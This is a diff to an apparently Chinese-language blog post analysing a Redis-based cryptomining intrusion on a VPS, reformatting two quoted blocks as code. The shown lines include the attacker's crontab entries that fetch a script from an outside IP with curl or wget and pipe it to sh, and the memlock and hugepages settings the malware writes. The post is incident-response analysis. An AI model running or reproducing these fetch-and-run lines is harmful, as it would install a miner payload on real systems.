@@ -37,8 +37,10 @@ comments:
 
 某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO 情况、网络流量、内存情况、系统日志、crontab 等。当排查到 crontab 时，发现 crontab 有如下的任务：
 
-> */5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh
-> */5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh
+``` bash
+*/5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh
+*/5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh
+```
 
 该服务器提供 Redis 资源供笔者测试使用，明显上面两个定时任务不是笔者创建的。定时任务访问外网服务器，紧急处理有三点，一是确认其他服务是否受到影响，二是注释定时任务，三是临时断外网，处理完之后，再来排查原因。
 
@@ -121,9 +123,11 @@ Options:
 
 CLEAN 函数也是一个毁灭性的函数。首先会修改 /etc/security/limits.conf 和 /etc/sysctl.conf 系统配置文件。加入如下配置：
 
-> \* soft memlock 262144
-> \* hard memlock 262144
-> vm.nr_hugepages = 256
+``` bash
+* soft memlock 262144
+* hard memlock 262144
+vm.nr_hugepages = 256
+```
 
 接下来删除 RMLIST 列表的文件，kill 掉 KILIST 列表的进程。KILIST 里有些什么呢？也是挖矿的钱包地址或者相关的进程。这位哥们只想自己获利，不关心兄弟的死活，呵呵。接下来执行疯狂的 kill，也是挖矿钱包地址或者相关的进程，不过这个列表就有点多了，在此不赘述。
 
